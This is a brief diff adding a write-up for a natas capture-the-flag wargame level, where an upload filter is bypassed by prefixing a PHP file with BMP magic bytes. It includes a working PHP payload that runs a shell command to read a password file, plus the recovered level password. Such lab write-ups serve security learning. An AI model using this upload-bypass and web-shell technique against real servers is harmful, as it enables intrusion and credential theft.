@@ -1,0 +1,12 @@
+Level is the same as natas13, but now it checks exif to ensure it has an image.
+exif_imagetype only checks the first couple of bytes in the file before determining what image it is.
+So, put the first three characters of a BMP at the beginning of the PHP file used in previous level.
+Redo, burp intercept to rename file to a php.
+
+BMz
+<?php
+        echo "natas14\n";
+        passthru("cat /etc/natas_webpass/natas14");
+?>
+
+password for natas14 is Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
